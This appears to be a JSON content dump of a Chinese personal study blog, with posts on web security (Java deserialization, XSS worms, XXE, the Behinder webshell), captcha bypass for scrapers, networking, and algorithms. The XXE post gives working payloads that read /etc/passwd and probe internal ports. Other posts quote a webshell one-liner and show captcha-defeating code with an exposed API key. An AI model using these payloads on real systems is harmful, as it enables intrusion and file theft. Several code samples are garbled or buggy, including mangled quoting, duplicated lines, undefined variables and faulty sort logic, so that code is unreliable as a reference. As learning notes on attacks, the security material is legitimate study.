{"meta":{"title":"风景这边独好","subtitle":"小风大浪，地狱天堂","description":"我的第一个个人博客（主题样式基于Hexo）","author":"Ye-Jun","url":"http://yejuns.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2021-05-06T00:35:59.654Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"/404.html","permalink":"http://yejuns.github.io/404.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":true,"path":"links/index.html","permalink":"http://yejuns.github.io/links/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"categories/index.html","permalink":"http://yejuns.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2021-05-06T00:35:59.656Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"books/index.html","permalink":"http://yejuns.github.io/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-05-06T05:18:15.029Z","updated":"2021-05-06T05:18:15.029Z","comments":false,"path":"about/index.html","permalink":"http://yejuns.github.io/about/index.html","excerpt":"","text":"个人详细介绍 平凡的世界，不平凡的你我"},{"title":"标签","date":"2021-05-06T00:35:59.658Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"tags/index.html","permalink":"http://yejuns.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-05-06T00:35:59.657Z","updated":"2020-12-09T03:59:04.000Z","comments":false,"path":"repository/index.html","permalink":"http://yejuns.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"web安全之反序列化漏洞-java","slug":"web安全之反序列化漏洞-java","date":"2021-06-14T08:01:51.000Z","updated":"2021-07-05T12:30:39.206Z","comments":true,"path":"2021/06/14/web安全之反序列化漏洞-java/","link":"","permalink":"http://yejuns.github.io/2021/06/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-java/","excerpt":"","text":"1.java序列化与反序列化在Java中，只要一个类实现了java.io.Serializable接口，那么它就可以通过ObjectInputStream与ObejctOutputStream序列化. 2.漏洞原因当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码，比如 123456//读取输入流,并转换对象InputStream in=request.getInputStream();ObjectInputStream ois = new ObjectInputStream(in);//恢复对象ois.readObject();ois.close(); 暴露或间接暴露反序列化API，导致用户可以操作传入数据，攻击者可以构造反序列化对象并执行恶意代码 3、案例 Apache Commons Collections反序列化漏洞详解 shiro反序列化漏洞其实自己还是有点没看明白，大概理解是使用gadget触发相关漏洞，但有部分细节还不了解","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"计算机网络复习笔记","slug":"计算机网络-复习笔记","date":"2021-05-01T13:01:21.000Z","updated":"2021-07-29T08:57:29.124Z","comments":true,"path":"2021/05/01/计算机网络-复习笔记/","link":"","permalink":"http://yejuns.github.io/2021/05/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"ARP协议arp协议即地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。它可以解决同一个局域网内主机或路由器的IP地址和MAC地址的映射问题。 arp协议在TCP/IP模型中属于IP层(网络层),原因在于ARP协议属于TCP/IP协议簇，而在TCP/IP模型中，所有定义的协议至少是在网际层（或称网络层，IP层） 在OSI模型中属于链路层,按照OSI的标准,当数据向下传递时,每层会加上自己的信息,各层互不干扰.这样当网络层的IP包进入链路层时,链路层该如何加这个头部的目标信息呢?它要依靠ARP协议来完成.显然如何加链路头并不是网络层的功能。而且，ARP协议工作时，并不使用IP的包头。所以也有很多人说，ARP是链路层的 TCP连接与断开TCP状态（SYN、FIN、ACK） SYN(Synchronize) 建立连接 FIN 断开连接 ACK 表示响应 PSH 有DATA数据传输 RST 连接重置 如果出现SYN/FIN包的组合，很有可能这是一个攻击，因为SYN和FIN不应该一起出现 三次握手过程1、（B）-&gt;[SYN] -&gt; (A) 当客户机B和服务器A通信时，B首先向A发送一个SYN标识的包，告诉A建立连接；(SYN包就是仅SYN标记标为1的TCP包) 2、（B）&lt;-[SYN/ACK] &lt;- (A) 接着，A收到后会发一个对SYN包的确定包（SYN/ACK）回去，表示对第一个SYN包的确定，并继续握手协议 3、（B）-&gt;[ACK] -&gt; (A)B收到SYN/ACK包，B发一个确认包（ACK），通知连接已经建立。至此，三次握手完成。 四次挥手过程1、(B) -&gt; FIN+ack -&gt; (A) 2、(B) &lt;- ACK &lt;- (A) 3、(B) &lt;- FIN+ACK &lt;- (A) 4、(B) -&gt; ACK -&gt; (A) 因为TCP连接是双向连接，因此关闭连接需要在两个方向上做。 四次挥手不是关闭TCP连接的唯一方式，有时主机需要尽快关闭连接（或连接超时、主机不可达），RST包将被发送，因为RST包是不需要接收方确认的，所以RST包对于ACK可带可不带。 为什么是四次挥手而不是三次挥手？ 因为TCP是全双工通信的， （1）第一次挥手因此当主动方发送断开连接的请求（即FIN报文）给被动方时，仅仅代表主动方不会再发送数据报文了，但主动方仍可以接收数据报文。 （2）第二次挥手被动方此时有可能还有相应的数据报文需要发送，因此需要先发送ACK报文，告知主动方“我知道你想断开连接的请求了”。这样主动方便不会因为没有收到应答而继续发送断开连接的请求（即FIN报文）。 （3）第三次挥手 被动方在处理完数据报文后，便发送给主动方FIN报文；这样可以保证数据通信正常可靠地完成。发送完FIN报文后，被动方进入LAST_ACK阶段（超时等待）。 （4）第四挥手 如果主动方及时发送ACK报文进行连接中断的确认，这时被动方就直接释放连接，进入可用状态。 HTTPS建立连接的过程https是在http的基础上和ssl/tls证书结合的一种协议，保证了传输过程中的安全性，解决了http的3个缺点（被监听、被篡改、被伪装） http与httpsHTTP和HTTPS都建立在连接的基础上进行数据传输，都基于TCP，建立连接都要经过3次握手 当在浏览器中输入地址后，会先根据浏览器DNS缓存、本地DNS缓存、和HOST中寻找对应的记录，如果没有找到会请求DNS服务来获取对应的ip 建立连接的过程 客户端发送请求到服务器，告诉自己支持的加密协议以及版本 服务端选择合适的加密协议，返回一个证书给客户端，证书里面有公钥 客户端接收公钥后验证证书的安全性，如果通过会生成一个随机数，用公钥对其机密后发送到服务端;(随机数产生的原因是减少公钥加密计算量太大所消耗的时间) 服务端接收到加密后的随机数，用私钥解密后得到真正的随机数，然后用这个随机数当秘钥（对称秘钥）对需要发送的数据进行加密 客户端接收到加密的数据后使用生成的随机数（对称秘钥）对数据进行解密，将结果呈现 ospf 和 rip 的区别ospf（open shortest path first）开发最短路径优先协议，是一种基于链路状态的路由协议。ospf与rip存在的本质区别是：rip是基于距离矢量算法的路由协议，而ospf是基于链路状态算法的路由协议。 rip 收敛速度慢，不适于大规模的网络，因此rip路由的最大跳数是15，如果一条路由的跳数达到了16，那么认为该路由是无效的。ospf 收敛速度快，所以适合大规模的网络，最多可支持几百台路由器。","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"web安全之XSS蠕虫","slug":"web安全之XSS蠕虫","date":"2021-04-21T03:01:51.000Z","updated":"2021-07-04T06:48:02.274Z","comments":true,"path":"2021/04/21/web安全之XSS蠕虫/","link":"","permalink":"http://yejuns.github.io/2021/04/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/","excerpt":"","text":"xss蠕虫一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。 XSS蠕虫一般原理 基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。 发送伪装的邀请链接。 用户点击链接被感染。 新感染用户的向好友发送伪装的邀请链接。 Samy 蠕虫","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"爬虫过验证码","slug":"爬虫之过验证码","date":"2021-04-09T08:01:51.000Z","updated":"2021-07-09T13:38:21.603Z","comments":true,"path":"2021/04/09/爬虫之过验证码/","link":"","permalink":"http://yejuns.github.io/2021/04/09/%E7%88%AC%E8%99%AB%E4%B9%8B%E8%BF%87%E9%AA%8C%E8%AF%81%E7%A0%81/","excerpt":"","text":"在我们写爬虫的过程中，目标网站常见的干扰手段就是设置验证码等，因此，这里将简单介绍一些绕过验证码的方式。 1、使用pytesseract模块和PIL模块识别使用pip安装相关的包 12pip install pytesseractpip install pil 整个验证码识别的思路很简单： 截取整个界面 获取验证码位置的坐标，并截取对应位置的图片 使用pytesseract模块进行验证 主要的功能代码如下： 12345678910111213141516171819202122#打开谷歌浏览器 browser = webdriver.Chrome() #打开首页 browser.get(&quot;http://localhost:8080/jpress/user/register&quot;) browser.maximize_window() #获取验证码图片 t = time.time() picture_name1 = str(t)+&#x27;.png&#x27; browser.save_screenshot(picture_name1) ce = browser.find_element_by_id(&quot;captchaimg&quot;) print(ce.location) left = ce.location[&#x27;x&#x27;] top = ce.location[&#x27;y&#x27;] right = ce.size[&#x27;width&#x27;] + left height = ce.size[&#x27;height&#x27;] + top im = Image.open(picture_name1) # 抠图 img = im.crop((left,top,right, height)) t = time.time() picture_name2 = str(t)+&#x27;.png&#x27; img.save(picture_name2)#这里就是截取到的验证码图片 browser.close() pytesseract虽然很简单直观，但是无法处理比较复杂的验证码。这时候其实我们还可以使用一些方法对图片进行处理，提供识别率。比如对截取的图片转为灰度，将有效信息转为黑，背景和干扰转为白色。 由于我们需要找到一个像素阈值能够将灰度图片中真实数据和背景干扰分开，因此这一步骤可以借助PS等工具，我们在这里设置为200 1234567891011img = image_obj.convert(&quot;L&quot;) # 转灰度图pixdata = img.load()w, h = img.sizethreshold = 200# 遍历所有像素，大于阈值的为黑色for y in range(h): for x in range(w): if pixdata[x, y] &lt; threshold: pixdata[x, y] =&quot; 0&quot; else:&gt;# 根据像素二值结果重新生成图片data = img.getdata()w, h = img.sizeblack_point = 0for x in range(1, w - 1): for y in range(1, h - 1): mid_pixel = data[w * y + x] if mid_pixel &lt; 50: top_pixel =&quot; data[w * (y - 1) + x]&quot; left_pixel =&quot; data[w * y + (x - 1)]&quot; down_pixel =&quot; data[w * (y + 1) + x]&quot; right_pixel =&quot; data[w * y + (x + 1)]&quot; if top_pixel &lt; 10: black_point +=&quot; 1&quot; if left_pixel &lt; 10: if down_pixel &lt; 10: if right_pixel &lt; 10: if black_point &lt; 1: img.putpixel((x, y), 255) black_point =&quot; 0&quot; img.show()&lt; code&gt; 转换前的图片 “ 转换后的图片 “ 2、使用第三方API接口帮助识别我以前是使用showapi,当然也可以选择别的方法，地址 整个验证的流程是： 下载官方提供的SDK包 在请求参数中加入自己的key 把图片和key值一起传给远程API，接收识别出的结果 12345678910111213from lib.ShowapiRequest import ShowapiRequestr = ShowapiRequest(&quot;http://route.showapi.com/184-4&quot;,&quot;272526&quot;,&quot;a924d4e982ae404b8a068b4d1c7784f2&quot; )r.addFilePara(&quot;image&quot;, &quot;test.png&quot;)r.addBodyPara(&quot;typeId&quot;, &quot;34&quot;)r.addBodyPara(&quot;convert_to_jpg&quot;, &quot;0&quot;)r.addBodyPara(&quot;needMorePrecise&quot;, &quot;0&quot;)res = r.post()result = res.textprint(result)body = res.json()[&#x27;showapi_res_body&#x27;]print(body[&#x27;Result&#x27;])# print(res.text) # 返回信息 有时候我们也可以自己使用tensorflow进行训练.","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"Web安全之XXE","slug":"Web安全之XXE攻击","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-04T08:02:23.953Z","comments":true,"path":"2021/03/31/Web安全之XXE攻击/","link":"","permalink":"http://yejuns.github.io/2021/03/31/Web%E5%AE%89%E5%85%A8%E4%B9%8BXXE%E6%94%BB%E5%87%BB/","excerpt":"","text":"XXE漏洞XXE漏洞全称XML External Entity Injection，即XML外部实体注入漏洞，是在对不安全的外部实体数据进行处理时引发的安全问题。（我们提交的post数据中，body可以是application/xml的形式） XXE漏洞原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者通过向服务器注入指定的xml实体内容,从而让服务器加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。也就是说服务端接收和解析了来自客户端的xml数据,而又没有做严格的安全过滤校验,从而导致xml外部实体注入漏洞的产生。 漏洞利用通常攻击者会将payload注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。 以下是一个正常的XML代码POST请求示例： 1234567891011121314151617POST /vulnerable HTTP/1.1Host: www.test.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0Accept-Language: en-US,en;q=0.5Referer: https://test.com/test.htmlContent-Type: application/xmlContent-Length: 294&lt;?xml version=&quot;1.0&quot;?&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;/core&gt;&lt;/catalog&gt; 上述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”: “Added!”} 我们尝试编辑恶意的payload 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; 代码被解释并返回： 12345&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync... 这样，我们就变相的读取了/etc/passwd文件 端口扫描我们也可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF。 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080&quot; &gt;]&gt;&lt;catalog&gt; &lt;core id=&quot;test101&quot;&gt; &lt;author&gt;John, Doe&lt;/author&gt; &lt;title&gt;I love XML&lt;/title&gt; &lt;category&gt;Computers&lt;/category&gt; &lt;price&gt;9.99&lt;/price&gt; &lt;date&gt;2018-10-01&lt;/date&gt; &lt;description&gt;&amp;xxe;&lt;/description&gt; &lt;/core&gt;&lt;/catalog&gt; 尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"常用算法-排序","slug":"常用算法-排序","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-29T06:37:26.996Z","comments":true,"path":"2021/03/31/常用算法-排序/","link":"","permalink":"http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F/","excerpt":"","text":"选择排序（Selection sort）每次选择最小值，然后放到待排序数组的开始位置 冒泡排序 （Bubble Sort）嵌套循环，每次查看相邻的元素，如果逆序，则交换 12345678910111213void sort(int[] num)&#123; boolean hasChange = false; // hasChange的作用是判断某次循环是否开始，方便提前结束循环 for(int i=0;i&lt;num.length-1;i++)&#123; hasChange = true; for(int j=0;j&lt;num.length-1-i;j++)&#123; if(num[j]&gt;num[j+1])&#123; swap(num[j],num[j+1]); &#125; hasChange = false; &#125; &#125;&#125; 插入排序（Insertion Sort）从前到后构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到位置并插入 123456789void sort(int[] nums) &#123; for (int i = 1, j, current; i &lt; nums.length; i++) &#123; current = nums[i]; //监视哨的作用 for (j = i - 1; j &gt;= 0 &amp;&amp; nums[j] &gt; current; j--) &#123; nums[j + 1] = nums[j]; &#125; nums[j + 1] = current; &#125;&#125; 归并排序（Merge Sort）// 使用的分治的思想。// 1. 把长度为n的输入序列分成长度为n/2的子序列// 2. 对这两个子序列分别进行归并排序// 3. 将两个排序好的子序列合并成一个最终的排序序列 1234567891011121314151617181920212223242526272829void sort(int[] A, int lo, int hi) &#123; if (lo &gt;= hi) return; int mid = lo + (hi - lo) / 2; sort(A, lo, mid); sort(A, mid + 1, hi); merge(A, lo, mid, hi);&#125;private void merge(int[] nums, int lo, int mid, int hi) &#123; int[] copy = nums.clone(); int k = lo, i = lo, j = mid + 1; //在合并过程中会有4种情况 while (k &lt;= hi) &#123; //左半边的都处理完了，现在需要把右半边的数拷贝过去 if (i &gt; mid) &#123; nums[k++] = copy[j++]; //右半边的都处理完了，现在需要把左半边的数拷贝过去 &#125; else if (j &gt; hi) &#123; nums[k++] = copy[i++]; //右边的数小于左边的数 &#125; else if (copy[j] &lt; copy[i]) &#123; nums[k++] = copy[j++]; //左边的数小于右边的数 &#125; else &#123; nums[k++] = copy[i++]; &#125; &#125;&#125; 快速排序（Quick sort）数组随机取一个标杆pivot，将小于pivot的元素放在pivot左边，大于pivot的元素放在pivot右边，然后依次对左边和右边的子数组继续快排。以达到整个序列有序 12345678910111213141516171819void sort(int[] nums, int lo, int hi) &#123; if (lo &gt;= hi) return; //如果只剩下最后一个元素，就直接返回 int p = partition(nums, lo, hi); //通过partition函数，使得p左边的值都比p要小，右边的都比p大 sort(nums, lo, p - 1); sort(nums, p + 1, hi);&#125;int partition(int[] nums, int lo, int hi) &#123; //随机选出一个数字，并和 hi 互换 --&gt; 此时选出进行比较的值就在 hi 处 swap(nums, randRange(lo, hi), hi); int i, j; for (i = lo, j = lo; j &lt; hi; j++) &#123; if (nums[j] &lt;= nums[hi]) &#123; swap(nums, i++, j); //注意这里是先交换，然后 ++ &#125; &#125; swap(nums, i, j); //把基准值放在i的位置，这样 i 后面的值都比i要大 return i;&#125; 拓扑排序 （Topological sort）前提：1、必须是有向图；2、图里面没有环 123456789101112131415void sort() &#123; Queue&lt;Integer&gt; q = new LinkedList(); for (int v = 0; v &lt; V; v++) &#123; if (indegree[v] == 0) q.add(v); &#125; while (!q.isEmpty()) &#123; int v = q.poll(); print(v); for (int u = 0; u &lt; adj[v].length; u++) &#123; if (--indegree[u] == 0) &#123; q.add(u); &#125; &#125; &#125;&#125; 堆排序 （Heap sort）堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。 参考资料： https://www.cnblogs.com/onepixel/p/7674659.html","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"常用算法-递归","slug":"常用算法-递归","date":"2021-03-31T08:01:51.000Z","updated":"2021-07-08T01:50:59.690Z","comments":true,"path":"2021/03/31/常用算法-递归/","link":"","permalink":"http://yejuns.github.io/2021/03/31/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92/","excerpt":"","text":"递归算法是一种调⽤⾃自身函数的算法 算法模板123456789101112131415function fn(n)&#123; //第一步：判断状态和条件是否合法 if(n is invalid)&#123; return ; &#125; //第二步：判断递归是否应该结束 if(match condition)&#123; return some operation; &#125; //第三步：缩小问题规模 result1 = fn(n1); result2 = fn(n2); //第四步：整合结果 return combine(result1+result2); &#125; 实例一一条包含字母 A-Z 的消息通过以下方式进行编码 ‘A’ -&gt; 1 ‘B’ -&gt; 2 …. ‘Z’ -&gt; 26 给定一个只包含数字的非空字符串，计算解码方式的总数 123456789101112131415161718192021int count = 0;int numDecode(String s)&#123; char[] chars = s.toCharArray(s); return decode(chars,chars.length()-1);&#125;int decode(char[] chars,int index)&#123; if(index &lt;= 0)&#123; return 1; &#125; char cur = chars[index]; char pre = chars[index-1]; if(cur &gt; &#x27;0&#x27;)&#123; count = decode(chars,index-1); &#125; if(pre &lt; &#x27;2&#x27; || (pre == &#x27;2&#x27; &amp;&amp; cur &lt; &#x27;6&#x27;))&#123; count +=decode(chars,index-2); &#125; return count;&#125; 实例二中心对称数是指一个数字经过180度旋转后看起来仍然相同的数字，比如“8，11，69”。 找出所有长度为n的中心对称数 比如：输入 2 ；输出 11，69，88，96 12345678910111213141516171819202122232425// 输入的n，m相同List&lt;String&gt; cal(int n,int m)&#123; if(n&lt;0||m&lt;0||n&gt;m)&#123; throw new IllegalArgumentException(&quot;invalid input&quot;); &#125; if(n==0) return new ArrayList&lt;String&gt;(Arrays.asList(&quot;&quot;)); if(n==1) return new ArrayList&lt;String&gt;(Arrays.aslist(&quot;0&quot;,&quot;1&quot;,&quot;8&quot;)); List&lt;String&gt; list = cal(n-2,m); list&lt;String&gt; result = new ArrayList&lt;String&gt;(); for(int i=0;i&lt;list.size();i++)&#123; String s = list.get(i); if(n!=m) result.add(&quot;0&quot;+s+&quot;0&quot;); result.add(&quot;1&quot;+s+&quot;1&quot;); result.add(&quot;9&quot;+s+&quot;6&quot;); result.add(&quot;9&quot;+s+&quot;6&quot;); result.add(&quot;8&quot;+s+&quot;8&quot;); &#125; return res;&#125; 递归的优缺点缺点：需要较多次数的函数调用，如果调用层数比较深，需要增加额外的堆栈处理(还有可能出现堆栈溢出的情况)，比如参数传递需要压栈等操作，会对执行效率有一定影响 优点：代码简洁、清晰","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"常用算法-回朔","slug":"常用算法-回朔","date":"2021-03-30T08:01:51.000Z","updated":"2021-07-09T12:10:06.310Z","comments":true,"path":"2021/03/30/常用算法-回朔/","link":"","permalink":"http://yejuns.github.io/2021/03/30/%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95-%E5%9B%9E%E6%9C%94/","excerpt":"","text":"回朔算法是一种试探算法，在回朔算法中，是一步一步向前试探，会对没每一步的结果进行预估，可防止走弯路。 算法模板1234567891011121314151617181920function fn(n)&#123; // 判断状态是否合法 if(input is invalid)&#123; return; &#125;// 判断递归是否应该结束 if(match condition)&#123; return some value; &#125;// 遍历所有可能出现的情况 for(all possible case)&#123; // 尝试下一步的可能性 solution.push(m); // 递归 result = fn(m); // 回朔到上一步 solution.pop(m); &#125;&#125; 实例一给定一个⽆重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合 candidates 中的数字可以无限制重复被选取 123456789101112131415161718192021222324252627class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; combinationSum(int[] candidates, int target) &#123; Arrays.sort(candidates); List&lt;Integer&gt; list = new ArrayList&lt;&gt;();//新建堆栈用来判断 List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;&gt;();//结果集 if (candidates == null || candidates.length == 0) return res; combin(candidates, 0, target, list, res); return res; &#125; //对数组元素（已排序）进行逐个判断以及加入结果集 private void combin(int[] candidates, int start, int target,List&lt;Integer&gt; list, List&lt;List&lt;Integer&gt;&gt; res) &#123; //刚好满足则将结果存入结果集 if (target == 0) &#123; res.add(new ArrayList&lt;&gt;(list)); return; &#125; for (int i = start; i &lt; candidates.length; i ++) &#123; if (candidates[i] &lt;= target) &#123; //判断是否已经大于target list.add(candidates[i]);//将第一个元素存入 combin(candidates, i, target -candidates[i] , list, res);//继续判断进栈元素 list.remove(list.size() - 1);//不满足则将最后一个元素移除，进栈新元素判断 &#125; &#125; &#125;&#125; 实例二如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 123456789101112131415161718192021222324252627282930313233// 处在对角线上也可以进行攻击boolean check(int row,int col,int[] columns)&#123; for(int r=0;r&lt;row;r++)&#123; if(columns[r]==col || row-r == Math.abs(columns[r]-col))&#123; return false; &#125; &#125; return true;&#125;int count;int totalNQueens(int n)&#123; count = 0; backtracking(n,0,new int[n]); return count;&#125;void backtracking(int n,int row,int[] columns)&#123; if(row == n)&#123; count++; return n; &#125; for(int col=0;col&lt;n;col++)&#123; columns[row] = col; if(check(row,col,columns))&#123; backtracking(n,row+1,columns); &#125; columns[row]=-1; &#125;&#125;","categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://yejuns.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"进程、线程和协程.md","slug":"进程、线程和协程md","date":"2021-03-23T07:56:49.000Z","updated":"2021-07-23T08:53:06.038Z","comments":true,"path":"2021/03/23/进程、线程和协程md/","link":"","permalink":"http://yejuns.github.io/2021/03/23/%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8Bmd/","excerpt":"","text":"计算机里有两类大的资源：CPU 资源和 IO 资源。 计算型的任务 主要消耗CPU 资源，比如对字符串进行 base64 编码； 输入输出类的系统调用 主要消耗 IO 资源，部分 IO 和硬件中断相关。CPU 芯片引脚上接入了很多控制芯片，比如中断控制器芯片 8259A。当键盘打字，中断芯片触发 CPU 上的硬件中断，CPU 被调度来处理键盘输入。 进程：一个进程好比是一个程序，它是资源分配的最小单位 。同一时刻执行的进程数不会超过核心数。但是单核CPU也可以运行多进程，只不过不是同时，而是极快地在进程间来回切换实现的多进程。举个简单的例子，就算是十年前的单核CPU的电脑，也可以聊QQ的同时看视频。 电脑中有许多进程需要处于「同时」开启的状态，而利用CPU在进程间的快速切换，可以实现「同时」运行多个程序。而进程切换则意味着需要保留进程切换前的状态，以备切换回去的时候能够继续接着工作。所以进程拥有自己的地址空间，全局变量，文件描述符，各种硬件等等资源。操作系统通过调度CPU去执行进程的记录、回复、切换等等。 线程：线程是依赖于进程的，也称为 「微进程」。它是程序执行过程中的最小单元 。假设现在 8 核 CPU 上有 4 个进程，每个进程开 10 个线程，理论上也只能同步并行跑 8 个线程，其他线程都是假性的并行运行。 进程与线程的区别 进程是CPU资源分配的基本单位，线程是独立运行和独立调度的基本单位（CPU上真正运行的是线程） 进程拥有自己的资源空间，一个进程包含若干个线程，线程与CPU资源分配无关，多个线程共享同一进程内的资源。 线程的调度与切换比进程快很多 举个例子：电脑上跑着chrome和QQ，着就是2个不同的进程。Chrome进程里有多个线程进行，比如下载文件、视频播放。每个线程占据一个核心（8核CUP中的一个）。从chrome切换到QQ，意味着进程进程了切换。 ps -T -p &lt;pid&gt; 查看该进程下的所有线程 协程： 协程是一种用户态的轻量级线程，拥有自己的寄存器上下文和栈，协程调度切换时，将寄存器上下文和栈保存在其他地方，再切回来的时候，回复先前的寄存器上下文和栈 协程表示一个执行单元，有自己的本地数据，与其他协程共享全局数据和其他资源 我们的代码跑在线程中的，而线程是跑在进程中的。协程没有直接和操作系统关联，但他是跑在线程中的，可以是单线程，也可以是多线程 线程进程都是同步机制，而协程则是异步（一个线程内的多个协程的运行是串行的） 协程优点 无需线程上下文切换的开销 无需原子操作锁定及同步的开销 方便切换控制流 高并发低成本 使用协程一般是解决 I/O阻塞 （为什么线程不能解决： 因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。） 因为当一个I/O阻塞时，它可以切换到其他没有阻塞的协程上去继续执行，这样就有了比较高的效率 参考资料 http://fuzhii.com/2021/04/02/coroutine-switch/?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.iohttps://mp.weixin.qq.com/s/Tp680dfOB7Zb6xlXSay7XA","categories":[],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://yejuns.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}]},{"title":"冰蝎使用","slug":"冰蝎使用","date":"2021-03-13T02:20:11.000Z","updated":"2021-07-03T08:17:49.641Z","comments":true,"path":"2021/03/13/冰蝎使用/","link":"","permalink":"http://yejuns.github.io/2021/03/13/%E5%86%B0%E8%9D%8E%E4%BD%BF%E7%94%A8/","excerpt":"","text":"冰蝎“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，最早的webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。 加密原理 一句话木马是一般是指一段短小精悍的恶意代码，这段代码可以用作一个代理来执行攻击者发送过来的任意指令，比如最常见的eval($_REQUEST[&quot;a&quot;]);。 但是随着防御手段的发展，也出现了很多的防御工具。一类是基于网络流量的，如各种云WAF、各种商业级硬件WAF、网络防火墙、Net Based IDS等，基于网络的防护设备其检测原理是对传输的流量数据进行特征检测。另一类是是基于主机的，如Host based 